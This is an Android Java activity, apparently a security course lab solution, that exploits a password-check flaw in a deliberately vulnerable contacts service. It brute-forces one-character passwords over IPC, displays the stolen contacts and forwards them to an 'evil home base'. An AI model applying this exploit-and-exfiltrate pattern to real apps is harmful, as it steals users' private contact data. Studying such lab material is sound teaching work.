package com.cs155.evilapp;

import com.cs155.evilapp.R;
import com.cs155.trustedapp.IGetContactsString;

import android.os.Bundle;
import android.os.IBinder;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;


public class MainActivity_no_key extends Activity {
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
    	super.onCreate(savedInstanceState);
    	setContentView(R.layout.activity_main);
    		
    	Button button = (Button) findViewById(R.id.btn_steal_contacts);

    	OnClickListener listen = new OnClickListener() {
    		public void onClick(View v) {
    		    /* The following line shows how to use the Log library. */ 
    		    Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");
    				
    		    stealContacts();
    		}
    	};
    	
    	button.setOnClickListener(listen);		
    }

    /* Use this method to display the contacts in the EvilApp GUI */
    private void showContacts(String contacts) {
    	TextView contactView = (TextView) findViewById(R.id.text_view_contacts);
    	contactView.setText("Contacts:\n" + contacts);
    	
    	/* Send the contacts to your evil home base
    	   Please do not remove this call */
    	MessageSender m = new MessageSender();
    	m.SendMessage(contacts);
    }


    private void stealContacts() {
	    /* IPC call to the TrustedApp's ReadContactsService */
        this.bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, BIND_AUTO_CREATE);
    }
    
    ServiceConnection mConnection = new ServiceConnection() {
    	public void onServiceDisconnected(ComponentName name) {}
    	  
    	public void onServiceConnected(ComponentName name, IBinder ibinder) {

    		try {
                /* Got a binding to the contacts service, cast it to IGetContactsString
                   to be able to call the GetContacts method on it */
                IGetContactsString service = IGetContactsString.Stub.asInterface((IBinder)ibinder);
    			
                /* Exploit the strcmp vulnerability in ReadContactsService (see README for 
                   detailed explanation of vulnerability): call the GetContacts method for
                   every one-character string as the candidate password, until one matches
                   the first character of the real password and we are granted access to 
                   the contacts */
                for (int c = Character.MIN_VALUE; c < Character.MAX_VALUE; c++) {
    		        
    				String password = Character.toString((char) c);
    				String contacts = service.GetContacts(password);
    				
                    if (!contacts.equals("")){ /* Request succeeded, show contacts */
    		        	showContacts(contacts);
    		        	return;
    		        }
    		    }

                /* If all calls to GetContacts returned "" then truly there are no
                   contacts on the device, since one attempt should have succeeded */
                showContacts("No contacts on device\n");
    		}
    		catch (Exception e) { return; }

    	}
   };
}
